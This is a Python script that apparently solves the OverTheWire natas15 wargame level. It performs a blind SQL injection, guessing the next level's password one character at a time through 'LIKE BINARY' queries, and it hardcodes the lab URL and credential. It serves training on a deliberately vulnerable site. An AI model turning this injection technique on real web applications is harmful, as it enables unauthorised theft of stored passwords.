import requests
import multiprocessing
import urllib.parse
import multiprocessing.managers

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

URL = "http://natas15.natas.labs.overthewire.org/"
USERNAME = "natas15"
PASSWORD = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

natas16_pass = ""


def brute_password(i, ret):
    query = f"""natas16" and password LIKE BINARY "{i}%"""
    query = urllib.parse.quote_plus(query)
    r = requests.get(URL+"?username="+query+"&debug",
                     auth=(USERNAME, PASSWORD))
    if "This user exists" in r.text:
        ret[i] = i

manager = multiprocessing.Manager()
return_dict = manager.dict()
while True:
    for i in alphabet:
        if len(return_dict) == 0:
            m = multiprocessing.Process(target=brute_password, args=[i, return_dict])
        else:
            m = multiprocessing.Process(target=brute_password, args=[''.join(i for i in return_dict.values()[-1])+i, return_dict])
        m.start()
    m.join()
    print(return_dict.values()[-1])